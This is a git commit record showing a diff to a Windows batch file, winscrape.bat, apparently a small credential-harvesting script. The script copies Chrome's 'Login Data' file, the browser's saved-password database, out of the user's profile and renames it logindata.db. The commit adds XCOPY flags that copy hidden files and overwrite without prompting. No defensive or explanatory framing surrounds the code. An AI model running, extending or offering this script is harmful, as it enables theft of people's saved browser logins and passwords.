8e0ec230cd093324690aee515675bc9c52c8a1bd
I2obiN <thomashood10@yahoo.com>
2016-09-18 03:40:56 +0100

    Update winscrape.bat

--- winscrape.bat
+++ winscrape.bat
@@ -1,2 +1,2 @@
-XCOPY "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Login Data" ./
+XCOPY /G /H /K /Y "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Login Data" ./
 rename "Login Data" logindata.db
